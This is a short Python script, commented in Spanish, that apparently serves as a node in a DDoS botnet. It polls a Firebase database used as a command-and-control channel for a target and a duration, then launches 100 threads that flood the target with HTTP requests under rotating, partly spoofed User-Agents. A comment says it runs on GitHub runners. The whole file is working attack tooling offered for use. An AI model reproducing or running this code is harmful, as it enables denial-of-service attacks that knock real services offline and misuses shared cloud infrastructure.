import requests
import time
import threading
import random

# Tu URL de Firebase confirmada en tus capturas
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"

def attack_engine(method, target, end_time):
    # Headers aleatorios para intentar saltar protecciones básicas
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0','Ryxen-Bot/1.0','GoogleBot']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
    while time.time() < end_time:
        try:
            # TLS Handshake / HTTP Request Spam
            requests.get(target, headers=headers, timeout=2)
        except:
            pass

def monitor():
    last_stamp = ""
    print("Node Online - Awaiting commands from Firebase...")
    while True:
        try:
            r = requests.get(DB_URL).json()
            if r and r.get('stamp') != last_stamp:
                last_stamp = r['stamp']
                target = r['target'] if r['target'].startswith("http") else f"http://{r['target']}"
                duration = int(r['time'])
                end_time = time.time() + duration
                
                print(f"Executing {r['method']} on {target} for {duration}s")
                # Lanzamos 100 hilos por cada runner de GitHub para máximo poder
                for _ in range(100):
                    threading.Thread(target=attack_engine, args=(r['method'], target, end_time), daemon=True).start()
        except:
            pass
        time.sleep(2)

if __name__ == "__main__":
    monitor()
  
